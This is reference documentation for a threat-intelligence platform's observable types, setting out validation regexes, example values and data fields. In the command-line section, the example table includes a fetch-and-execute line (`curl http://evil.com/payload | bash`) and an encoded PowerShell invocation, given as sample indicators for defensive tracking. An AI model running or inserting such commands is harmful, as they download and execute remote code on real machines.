# Observable Types -- Validation Rules and Reference

## Overview

EmergentCTI supports 10 observable types, defined as the `ObservableType` enum in `src/cti/models/observable.py`. Each type has specific validation rules enforced at the Pydantic schema level in `src/cti/schemas/observable.py`.

Observables are deduplicated by the composite unique key `(type, value)` -- the `uq_observable_type_value` constraint.

---

## Type Reference

### 1. `ip-addr` -- IPv4 and IPv6 Addresses

**Validation:** `ipaddress.ip_address(value)`

Accepts any valid IPv4 or IPv6 address as parsed by Python's `ipaddress` standard library.

| Valid Examples | Invalid Examples |
|---------------|-----------------|
| `192.168.1.1` | `999.999.999.999` |
| `10.0.0.1` | `192.168.1` |
| `2001:db8::1` | `not-an-ip` |
| `::1` | `192.168.1.1/24` (use cidr type) |

**Enrichment support:** VirusTotal, AbuseIPDB, Shodan, GreyNoise

---

### 2. `domain-name` -- Fully Qualified Domain Names

**Validation:** Regex match

```python
DOMAIN_REGEX = re.compile(
    r"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$"
)
```

Rules:
- Each label starts and ends with alphanumeric characters
- Labels can contain hyphens but not at start or end
- Each label is 1-63 characters long
- TLD must be at least 2 characters
- No trailing dot

| Valid Examples | Invalid Examples |
|---------------|-----------------|
| `example.com` | `example` (no TLD) |
| `sub.domain.co.uk` | `-invalid.com` (starts with hyphen) |
| `my-site.org` | `.example.com` (starts with dot) |
| `a.io` | `example.c` (TLD too short) |

**Enrichment support:** VirusTotal, URLScan

---

### 3. `url` -- HTTP/HTTPS URLs

**Validation:** Regex match

```python
URL_REGEX = re.compile(r"^https?://\S+$")
```

Rules:
- Must start with `http://` or `https://`
- Must contain at least one non-whitespace character after the scheme
- No whitespace allowed anywhere in the URL

| Valid Examples | Invalid Examples |
|---------------|-----------------|
| `https://example.com/path` | `ftp://example.com` (wrong scheme) |
| `http://192.168.1.1:8080/` | `example.com` (no scheme) |
| `https://example.com/search?q=test` | `https://` (nothing after scheme) |

**Enrichment support:** VirusTotal, URLScan

---

### 4. `file-hash` -- Cryptographic File Hashes

**Validation:** Hexadecimal string with specific length

```python
HASH_LENGTHS = {"md5": 32, "sha1": 40, "sha256": 64, "sha512": 128}
```

Rules:
- Must contain only hexadecimal characters (`[a-f0-9]`)
- Length must match one of the supported hash algorithms
- Value is normalized to lowercase on validation

| Algorithm | Length | Valid Example |
|-----------|--------|--------------|
| MD5 | 32 | `d41d8cd98f00b204e9800998ecf8427e` |
| SHA1 | 40 | `da39a3ee5e6b4b0d3255bfef95601890afd80709` |
| SHA256 | 64 | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |
| SHA512 | 128 | `cf83e1357eefb8bdf1542850d66d8007...` (128 hex chars) |

**Enrichment support:** VirusTotal

---

### 5. `email-addr` -- Email Addresses

**Validation:** Regex match

```python
EMAIL_REGEX = re.compile(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$")
```

Rules:
- Local part allows alphanumeric, dots, underscores, percent, plus, hyphen
- Must contain exactly one `@` symbol
- Domain part follows standard domain rules
- TLD must be at least 2 characters

| Valid Examples | Invalid Examples |
|---------------|-----------------|
| `user@example.com` | `user@` (no domain) |
| `first.last@company.org` | `@example.com` (no local part) |
| `user+tag@mail.co.uk` | `user@.com` (empty domain label) |

**Enrichment support:** None currently (planned: Have I Been Pwned)

---

### 6. `command-line` -- Command Line Strings

**Validation:** Minimum length check

```
Minimum length: 2 characters
```

This is a loose validation for command-line artifacts observed in threat intelligence (malware execution commands, PowerShell scripts, etc.).

| Valid Examples | Invalid Examples |
|---------------|-----------------|
| `powershell -enc Base64String` | `a` (too short) |
| `cmd /c whoami` | `` (empty) |
| `curl http://evil.com/payload \| bash` | |

**Enrichment support:** None

---

### 7. `user-agent` -- HTTP User-Agent Strings

**Validation:** Minimum length check

```
Minimum length: 5 characters
```

Used to track suspicious or known-malicious user-agent strings seen in HTTP traffic.

| Valid Examples | Invalid Examples |
|---------------|-----------------|
| `Mozilla/5.0 (Windows NT 10.0; Win64)` | `curl` (too short) |
| `python-requests/2.28.0` | `UA` (too short) |
| `Go-http-client/1.1` | |

**Enrichment support:** None

---

### 8. `certificate` -- TLS Certificate Fingerprints

**Validation:** SHA1 (40 hex chars) or SHA256 (64 hex chars) fingerprint

Rules:
- Must be a valid hexadecimal string
- Length must be exactly 40 (SHA1) or 64 (SHA256)
- Normalized to lowercase

| Algorithm | Length | Valid Example |
|-----------|--------|--------------|
| SHA1 | 40 | `da39a3ee5e6b4b0d3255bfef95601890afd80709` |
| SHA256 | 64 | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |

**Enrichment support:** None currently (planned: Censys)

---

### 9. `asn` -- Autonomous System Numbers

**Validation:** Regex match

```python
ASN_REGEX = re.compile(r"^AS\d+$", re.IGNORECASE)
```

Rules:
- Must start with `AS` (case-insensitive)
- Followed by one or more digits
- No spaces or other characters

| Valid Examples | Invalid Examples |
|---------------|-----------------|
| `AS13335` | `13335` (missing AS prefix) |
| `AS1` | `AS` (no number) |
| `AS399486` | `ASN13335` (wrong prefix) |

**Enrichment support:** Shodan (via IP lookup)

---

### 10. `cidr` -- CIDR Network Notation

**Validation:** `ipaddress.ip_network(value, strict=False)`

Rules:
- Must be a valid IPv4 or IPv6 CIDR block
- `strict=False` allows host bits to be set (e.g., `192.168.1.100/24` normalizes to the network)
- Both IPv4 and IPv6 CIDR blocks are supported

| Valid Examples | Invalid Examples |
|---------------|-----------------|
| `192.168.1.0/24` | `192.168.1.0` (no prefix length) |
| `10.0.0.0/8` | `999.0.0.0/8` (invalid IP) |
| `2001:db8::/32` | `192.168.1.0/33` (prefix too large) |

**Enrichment support:** None directly (individual IPs are enriched)

---

## Observable Categories

Observables can be categorized with one of these predefined values:

```python
OBSERVABLE_CATEGORIES = [
    "malware", "c2", "trojan", "phishing", "ransomware", "botnet",
    "exploit", "apt", "scanner", "spam", "suspicious", "benign", "other",
]
```

---

## Common Fields

All observables share these fields:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | ObservableType | required | One of the 10 types above |
| `value` | String(2048) | required | The observable value |
| `confidence_score` | Integer (0-100) | 50 | Threat confidence level |
| `first_seen` | DateTime | null | When first observed |
| `last_seen` | DateTime | null | When last observed |
| `tlp` | String(16) | "clear" | Traffic Light Protocol marking |
| `context` | JSONB | null | Additional provider metadata |
| `category` | String(64) | null | Threat category |
| `description` | Text | null | Human-readable description |
| `external_references` | JSONB | null | Links to external sources |
| `expires_at` | DateTime | null | Expiration time (from TTL) |
| `is_active` | Boolean | true | Whether the observable is active |
| `tags` | M:N (Tag) | [] | User-assigned tags |
| `sources` | M:N (Feed) | [] | Feeds that reported this observable |

---

## Related Files

- **Model:** `src/cti/models/observable.py`
- **Schema:** `src/cti/schemas/observable.py`
- **Validation:** `src/cti/schemas/observable.py` (ObservableCreate model_validator)
- **Confidence:** `context/confidence_model.md`
